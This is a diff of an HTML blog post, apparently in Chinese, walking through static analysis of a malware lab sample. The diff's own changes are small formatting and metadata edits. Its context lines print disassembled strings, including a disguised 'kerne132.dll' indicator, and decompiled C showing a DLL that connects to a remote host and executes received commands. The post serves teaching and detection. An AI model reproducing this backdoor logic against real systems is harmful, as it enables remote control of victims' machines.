@@ -97,7 +97,7 @@
 <meta property="og:description" content="静态分析基础技术知识点我觉得安全圈的思路都是差不多的，跟渗透测试一样，对一个恶意软件的分析也需要前期的信息收集阶段来帮助我们对目标有一个大致的了解和认识，方便确定下一步工作的方向。 Virus Total：首先，拿到一个恶意软件如果不涉密的话可以直接上传到VT上看一下，这样差不多能确定此恶意软件的最早爆发日期和各种关键的信息。 哈希值：hash值就相当于恶意软件的指纹，是一个很重要的信息。 关键字">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://i.loli.net/2019/01/17/5c4035990c466.png">
-<meta property="og:updated_time" content="2019-01-17T14:46:41.592Z">
+<meta property="og:updated_time" content="2019-01-17T15:00:34.480Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="静态分析基础技术">
 <meta name="twitter:description" content="静态分析基础技术知识点我觉得安全圈的思路都是差不多的，跟渗透测试一样，对一个恶意软件的分析也需要前期的信息收集阶段来帮助我们对目标有一个大致的了解和认识，方便确定下一步工作的方向。 Virus Total：首先，拿到一个恶意软件如果不涉密的话可以直接上传到VT上看一下，这样差不多能确定此恶意软件的最早爆发日期和各种关键的信息。 哈希值：hash值就相当于恶意软件的指纹，是一个很重要的信息。 关键字">
@@ -462,7 +462,6 @@
 <th>Virtual Size</th>
 <th>Raw Size</th>
 <th>Entropy</th>
-<th>MD5</th>
 </tr>
 </thead>
 <tbody>
@@ -472,7 +471,6 @@
 <td>2416</td>
 <td>4096</td>
 <td>4.45</td>
-<td>7e39ebe7cdeda4c636d513a0fe140ff4</td>
 </tr>
 </tbody>
 </table>
@@ -487,7 +485,7 @@
 <p><strong>5.是否有任何其他文件或基于主机的迹象，让你可以在受感染系统上查找？</strong></p>
 <p>通过查看程序中的字符串，很容易可以发现如下字符串：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.data:0040304C NewFileName     db &apos;C:\windows\system32\kerne132.dll&apos;,0</span><br><span class="line">.data:0040304C                                         ; DATA XREF: _main+3AA↑o</span><br><span class="line">.data:0040306D                 align 10h</span><br><span class="line">.data:00403070 dword_403070    dd 6E72654Bh            ; DATA XREF: _main+2DF↑r</span><br><span class="line">.data:00403074 dword_403074    dd 32336C65h            ; DATA XREF: _main+2E7↑r</span><br><span class="line">.data:00403078 byte_403078     db 2Eh                  ; DATA XREF: _main+2F2↑r</span><br><span class="line">.data:00403079                 align 4</span><br><span class="line">.data:0040307C ; CHAR ExistingFileName[]</span><br><span class="line">.data:0040307C ExistingFileName db &apos;Lab01-01.dll&apos;,0    ; DATA XREF: _main+A7↑o</span><br><span class="line">.data:0040307C                                         ; _main+3AF↑o</span><br><span class="line">.data:00403089                 align 4</span><br><span class="line">.data:0040308C ; CHAR FileName[]</span><br><span class="line">.data:0040308C FileName        db &apos;C:\Windows\System32\Kernel32.dll&apos;,0</span><br></pre></td></tr></table></figure>
-<p>因此我们可以查看<code>C:\windows\system32\kerne132.dll</code>文件是否存在，这里的<code>kernel</code>的最后的l用数字<code>1</code>代替了。</p>
+<p>因此我们可以查看<code>C:\windows\system32\kerne132.dll</code>文件是否存在，这里的<code>kernel</code>的最后的<code>l</code>用数字<code>1</code>代替了。</p>
 <p><strong>6.是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码？</strong></p>
 <p>通过<code>IDA</code>查看<code>dll</code>文件的伪C代码，可以才看到在<code>DllMain()</code>函数中存在如下部分代码用于网络连接：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 != <span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          name.sa_family = <span class="number">2</span>;</span><br><span class="line">          *(_DWORD *)&amp;name.sa_data[<span class="number">2</span>] = inet_addr(cp);</span><br><span class="line">          *(_WORD *)name.sa_data = htons(<span class="number">0x50</span>u);</span><br><span class="line">          <span class="keyword">if</span> ( connect(v3, &amp;name, <span class="number">16</span>) != <span class="number">-1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">while</span> ( send(v3, ::buf, <span class="built_in">strlen</span>(::buf), <span class="number">0</span>) != <span class="number">-1</span> &amp;&amp; shutdown(v3, <span class="number">1</span>) != <span class="number">-1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( recv(v3, &amp;buf, <span class="number">4096</span>, <span class="number">0</span>) &gt; <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, &amp;buf, <span class="number">5u</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                  Sleep(<span class="number">0x60000</span>u);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(aExec, &amp;buf, <span class="number">4u</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">memset</span>(&amp;StartupInfo, <span class="number">0</span>, <span class="keyword">sizeof</span>(StartupInfo));</span><br><span class="line">                  StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">                  CreateProcessA(<span class="number">0</span>, &amp;CommandLine, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0x8000000</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>
